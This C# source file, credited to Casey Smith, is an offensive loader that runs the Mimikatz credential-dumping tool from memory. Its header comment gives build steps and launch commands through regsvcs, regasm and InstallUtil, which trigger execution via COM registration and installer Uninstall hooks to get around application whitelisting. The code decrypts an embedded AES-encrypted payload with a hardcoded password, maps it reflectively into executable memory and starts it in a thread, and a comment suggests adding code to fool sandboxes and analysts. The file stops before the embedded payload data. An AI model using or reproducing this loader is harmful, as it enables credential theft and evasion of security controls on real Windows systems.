using System;
using System.IO;
using System.Text;
using System.IO.Compression;
using System.EnterpriseServices;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography;


/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause

Create Your Strong Name Key -> key.snk

$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte

C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs

C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe 
x64
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe katz.exe 

[OR]
C:\Windows\Microsoft.NET\Framework\vv2.0.50727\regasm.exe katz.exe
//Executes UnRegisterClass If you don't have permissions

C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe /U katz.exe 
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U katz.exe
xC:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U katz.exe
//This calls the UnregisterClass Method

[OR]

C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /U katz.exe
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /U katz.exe



*/



namespace Delivery
{

    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("Hello From Main...I Don't Do Anything");
            //Add any behaviour here to throw off sandbox execution/analysts :)
            Katz.Exec();

            /*
			//Example Extract Files and Encrypt.  Ideally you would compress.  But .NET 2 doesn't have really good Compression Libraries..
            byte[] b  = Misc.FileToByteArray(@"mimikatz.exe");
            byte[] e = Misc.Encrypt(b,"password");
            string f = System.Convert.ToBase64String(e);
            File.WriteAllText(@"file.b64",f);
            
			byte[] b1  = Misc.FileToByteArray(@"mimikatzx86.exe");
            byte[] e1 = Misc.Encrypt(b1,"password");
            string f1 = System.Convert.ToBase64String(e1);
            File.WriteAllText(@"filex86.b64",f1);
			*/
			

        }

    }


    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {

            Console.WriteLine("Hello There From Uninstall");
            Katz.Exec();

        }

    }

    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComRegisterFunction] //This executes if registration is successful
        public static void RegisterClass(string key)
        {
            Katz.Exec();
        }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            Katz.Exec();
        }
    }



    public class Katz
    {
		//Since .NET 2 doesn't have a method for this, this should do the trick...
		public static IntPtr IntPtrAdd(IntPtr a, int b)
		{
			IntPtr ptr = new IntPtr(a.ToInt64() + b);
			return ptr;
		}
		
        public static void Exec()
        {

		
            byte[] latestMimikatz = null;
            try
            {

                //Use Misc Class to encrypt your own files
				
               

				if (IntPtr.Size == 8 ) 
				{
					//x64 Unpack And Execute
					latestMimikatz = Misc.Decrypt(Convert.FromBase64String(Package.filex64), "password"); //Yes, this is a bad idea. 

				}
				else if (IntPtr.Size == 4 )
				{
					//x86 Unpack And Execute
					latestMimikatz = Misc.Decrypt(Convert.FromBase64String(Package.filex86), "password"); //Yes, this is a bad idea. 

				}

                

            }
            catch (Exception ex)
            {
                while (ex != null)
                {
                    Console.WriteLine(ex.Message);
                    ex = ex.InnerException;
                }
            }

            Console.WriteLine("Downloaded Latest");
            PELoader pe = new PELoader(latestMimikatz);



            IntPtr codebase = IntPtr.Zero;

            if (pe.Is32BitHeader)
            {
                Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader32.ImageBase.ToString("X4"));
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader32.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader32.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
            }
            else
            {
                Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
                codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
            }



            //Copy Sections
            for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
            {

                IntPtr y = NativeDeclarations.VirtualAlloc(IntPtrAdd(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
                Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
            }

            //Perform Base Relocation
            //Calculate Delta
            IntPtr currentbase = codebase;
            long delta;
            if (pe.Is32BitHeader)
            {

                delta = (int)(currentbase.ToInt32() - (int)pe.OptionalHeader32.ImageBase);
            }
            else
            {

                delta = (long)(currentbase.ToInt64() - (long)pe.OptionalHeader64.ImageBase);
            }

            Console.WriteLine("Delta = {0}", delta.ToString("X4"));

            //Modify Memory Based On Relocation Table
            IntPtr relocationTable;
            if (pe.Is32BitHeader)
            {
                relocationTable = (IntPtrAdd(codebase, (int)pe.OptionalHeader32.BaseRelocationTable.VirtualAddress));
            }
            else
            {
                relocationTable = (IntPtrAdd(codebase, (int)pe.OptionalHeader64.BaseRelocationTable.VirtualAddress));
            }


            NativeDeclarations.IMAGE_BASE_RELOCATION relocationEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
            relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = relocationTable;
            int sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
            IntPtr offset = relocationTable;

            while (true)
            {

                NativeDeclarations.IMAGE_BASE_RELOCATION relocationNextEntry = new NativeDeclarations.IMAGE_BASE_RELOCATION();
                IntPtr x = IntPtrAdd(relocationTable, sizeofNextBlock);
                relocationNextEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(x, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));

                IntPtr dest = IntPtrAdd(codebase, (int)relocationEntry.VirtualAdress);

                for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++)
                {

                    IntPtr patchAddr;
                    UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                    UInt16 type = (UInt16)(value >> 12);
                    UInt16 fixup = (UInt16)(value & 0xfff);

                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0x3:
                            patchAddr = IntPtrAdd(dest, fixup);
                            //Add Delta To Location.                            
                            int originalx86Addr = Marshal.ReadInt32(patchAddr);
                            Marshal.WriteInt32(patchAddr, originalx86Addr + (int)delta);
                            break;
                        case 0xA:
                            patchAddr = IntPtrAdd(dest, fixup);
                            //Add Delta To Location.
                            long originalAddr = Marshal.ReadInt64(patchAddr);
                            Marshal.WriteInt64(patchAddr, originalAddr + delta);
                            break;

                    }

                }

                offset = IntPtrAdd(relocationTable, sizeofNextBlock);
                sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;

                nextEntry = IntPtrAdd(nextEntry, sizeofNextBlock);

                if (relocationNextEntry.SizeOfBlock == 0) break;


            }


            //Resolve Imports

            IntPtr z;
            IntPtr oa1;
            int oa2;

            if (pe.Is32BitHeader)
            {
                z = IntPtrAdd(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                oa1 = IntPtrAdd(codebase, (int)pe.OptionalHeader32.ImportTable.VirtualAddress);
                oa2 = Marshal.ReadInt32(IntPtrAdd(oa1, 16));
            }
            else
            {
                z = IntPtrAdd(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress);
                oa1 = IntPtrAdd(codebase, (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                oa2 = Marshal.ReadInt32(IntPtrAdd(oa1, 16));
            }



            //Get And Display Each DLL To Load

            IntPtr threadStart;
            IntPtr hThread;
            if (pe.Is32BitHeader)
            {
                int j = 0;
                while (true) //HardCoded Number of DLL's Do this Dynamically.
                {
                    IntPtr a1 = IntPtrAdd(codebase, (20 * j) + (int)pe.OptionalHeader32.ImportTable.VirtualAddress);
                    int entryLength = Marshal.ReadInt32(IntPtrAdd(a1, 16));
                    IntPtr a2 = IntPtrAdd(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2));
                    IntPtr dllNamePTR = (IntPtr)(IntPtrAdd(codebase, Marshal.ReadInt32(IntPtrAdd(a1, 12))));
                    string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                    if (DllName == "") { break; }

                    IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                    Console.WriteLine("Loaded {0}", DllName);
                    int k = 0;
                    while (true)
                    {
                        IntPtr dllFuncNamePTR = (IntPtrAdd(codebase, Marshal.ReadInt32(a2)));
                        string DllFuncName = Marshal.PtrToStringAnsi(IntPtrAdd(dllFuncNamePTR, 2));
                        IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                        Marshal.WriteInt32(a2, (int)funcAddy);
                        a2 = IntPtrAdd(a2, 4);
                        if (DllFuncName == "") break;
                        k++;
                    }
                    j++;
                }
                //Transfer Control To OEP
                Console.WriteLine("Executing Mimikatz");
                threadStart = IntPtrAdd(codebase, (int)pe.OptionalHeader32.AddressOfEntryPoint);
                hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                Console.WriteLine("Thread Complete");
            }
            else
            {
                int j = 0;
                while (true)
                {
                    IntPtr a1 = IntPtrAdd(codebase, (20 * j) + (int)pe.OptionalHeader64.ImportTable.VirtualAddress);
                    int entryLength = Marshal.ReadInt32(IntPtrAdd(a1, 16));
                    IntPtr a2 = IntPtrAdd(codebase, (int)pe.ImageSectionHeaders[1].VirtualAddress + (entryLength - oa2)); //Need just last part? 
                    IntPtr dllNamePTR = (IntPtr)(IntPtrAdd(codebase, Marshal.ReadInt32(IntPtrAdd(a1, 12))));
                    string DllName = Marshal.PtrToStringAnsi(dllNamePTR);
                    if (DllName == "") { break; }

                    IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
                    Console.WriteLine("Loaded {0}", DllName);
                    int k = 0;
                    while (true)
                    {
                        IntPtr dllFuncNamePTR = (IntPtrAdd(codebase, Marshal.ReadInt32(a2)));
                        string DllFuncName = Marshal.PtrToStringAnsi(IntPtrAdd(dllFuncNamePTR, 2));
                        //Console.WriteLine("Function {0}", DllFuncName);
                        IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                        Marshal.WriteInt64(a2, (long)funcAddy);
                        a2 = IntPtrAdd(a2, 8);
                        if (DllFuncName == "") break;
                        k++;
                    }
                    j++;
                }
                //Transfer Control To OEP
                Console.WriteLine("Executing Mimikatz");
                threadStart = IntPtrAdd(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);

                Console.WriteLine("Thread Complete");
            }

            //Transfer Control To OEP

            Console.WriteLine("Thread Complete");
            //Console.ReadLine();




        } //End Main



    }//End Program

    public class PELoader
    {
        public struct IMAGE_DOS_HEADER
        {      // DOS .EXE header
            public UInt16 e_magic;              // Magic number
            public UInt16 e_cblp;               // Bytes on last page of file
            public UInt16 e_cp;                 // Pages in file
            public UInt16 e_crlc;               // Relocations
            public UInt16 e_cparhdr;            // Size of header in paragraphs
            public UInt16 e_minalloc;           // Minimum extra paragraphs needed
            public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
            public UInt16 e_ss;                 // Initial (relative) SS value
            public UInt16 e_sp;                 // Initial SP value
            public UInt16 e_csum;               // Checksum
            public UInt16 e_ip;                 // Initial IP value
            public UInt16 e_cs;                 // Initial (relative) CS value
            public UInt16 e_lfarlc;             // File address of relocation table
            public UInt16 e_ovno;               // Overlay number
            public UInt16 e_res_0;              // Reserved words
            public UInt16 e_res_1;              // Reserved words
            public UInt16 e_res_2;              // Reserved words
            public UInt16 e_res_3;              // Reserved words
            public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
            public UInt16 e_oeminfo;            // OEM information; e_oemid specific
            public UInt16 e_res2_0;             // Reserved words
            public UInt16 e_res2_1;             // Reserved words
            public UInt16 e_res2_2;             // Reserved words
            public UInt16 e_res2_3;             // Reserved words
            public UInt16 e_res2_4;             // Reserved words
            public UInt16 e_res2_5;             // Reserved words
            public UInt16 e_res2_6;             // Reserved words
            public UInt16 e_res2_7;             // Reserved words
            public UInt16 e_res2_8;             // Reserved words
            public UInt16 e_res2_9;             // Reserved words
            public UInt32 e_lfanew;             // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [Flags]
        public enum DataSectionFlags : uint
        {

            Stub = 0x00000000,

        }


        /// The DOS header

        private IMAGE_DOS_HEADER dosHeader;

        /// The file header

        private IMAGE_FILE_HEADER fileHeader;

        /// Optional 32 bit file header 

        private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

        /// Optional 64 bit file header 

        private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

        /// Image Section headers. Number of sections is in the file header.

        private IMAGE_SECTION_HEADER[] imageSectionHeaders;

        private byte[] rawbytes;



        public PELoader(string filePath)
        {
            // Read in the DLL or EXE and get the timestamp
            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }



                rawbytes = System.IO.File.ReadAllBytes(filePath);

            }
        }

        public PELoader(byte[] fileBytes)
        {
            // Read in the DLL or EXE and get the timestamp
            using (MemoryStream stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

                // Add 4 bytes to the offset
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
                if (this.Is32BitHeader)
                {
                    optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                }
                else
                {
                    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
                {
                    imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }


                rawbytes = fileBytes;

            }
        }


        public static T FromBinaryReader<T>(BinaryReader reader)
        {
            // Read in a byte array
            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

            // Pin the managed memory while, copy it out the data, then unpin it
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }



        public bool Is32BitHeader
        {
            get
            {
                UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
                return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
            }
        }


        public IMAGE_FILE_HEADER FileHeader
        {
            get
            {
                return fileHeader;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
        {
            get
            {
                return optionalHeader32;
            }
        }


        /// Gets the optional header

        public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
        {
            get
            {
                return optionalHeader64;
            }
        }

        public IMAGE_SECTION_HEADER[] ImageSectionHeaders
        {
            get
            {
                return imageSectionHeaders;
            }
        }

        public byte[] RawBytes
        {
            get
            {
                return rawbytes;
            }

        }

    }//End Class


    unsafe class NativeDeclarations
    {

        public static uint MEM_COMMIT = 0x1000;
        public static uint MEM_RESERVE = 0x2000;
        public static uint PAGE_EXECUTE_READWRITE = 0x40;
        public static uint PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(

          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          uint dwCreationFlags,
          IntPtr lpThreadId
          );

        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }


    }

    public class Misc
    {
        //Change This!
        private static readonly byte[] SALT = new byte[] { 0xba, 0xdc, 0x0f, 0xfe, 0xeb, 0xad, 0xbe, 0xfd, 0xea, 0xdb, 0xab, 0xef, 0xac, 0xe8, 0xac, 0xdc };

        public static void Stage(string fileName, string Key, string outFile)
        {

            byte[] raw = FileToByteArray(fileName);
            byte[] file = Encrypt(raw, Key);

            FileStream fileStream = File.Create(outFile);

            fileStream.Write(file, 0, file.Length);//Write stream to temp file

            Console.WriteLine("File Ready, Now Deliver Payload");

        }

        public static byte[] FileToByteArray(string _FileName)
        {
            byte[] _Buffer = null;
            System.IO.FileStream _FileStream = new System.IO.FileStream(_FileName, System.IO.FileMode.Open, System.IO.FileAccess.Read);
            System.IO.BinaryReader _BinaryReader = new System.IO.BinaryReader(_FileStream);
            long _TotalBytes = new System.IO.FileInfo(_FileName).Length;
            _Buffer = _BinaryReader.ReadBytes((Int32)_TotalBytes);
            _FileStream.Close();
            _FileStream.Dispose();
            _BinaryReader.Close();
            return _Buffer;
        }

        public static byte[] Encrypt(byte[] plain, string password)
        {
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
            Rijndael rijndael = Rijndael.Create();
            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
            rijndael.Key = pdb.GetBytes(32);
            rijndael.IV = pdb.GetBytes(16);
            memoryStream = new MemoryStream();
            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(plain, 0, plain.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }
        public static byte[] Decrypt(byte[] cipher, string password)
        {
            MemoryStream memoryStream;
            CryptoStream cryptoStream;
            Rijndael rijndael = Rijndael.Create();
            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, SALT);
            rijndael.Key = pdb.GetBytes(32);
            rijndael.IV = pdb.GetBytes(16);
            memoryStream = new MemoryStream();
            cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
            cryptoStream.Write(cipher, 0, cipher.Length);
            cryptoStream.Close();
            return memoryStream.ToArray();
        }

        public static byte[] ReadFully(Stream input) //Returns Byte Array From Stream 
        {
            byte[] buffer = new byte[16 * 1024];
            using (MemoryStream ms = new MemoryStream())
            {
                int read;
                while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
                {
                    ms.Write(buffer, 0, read);
                }
                return ms.ToArray();
            }
        }

    }//End Misc Class

    public class Package
    {
        //Latest As Of 12/31/2015
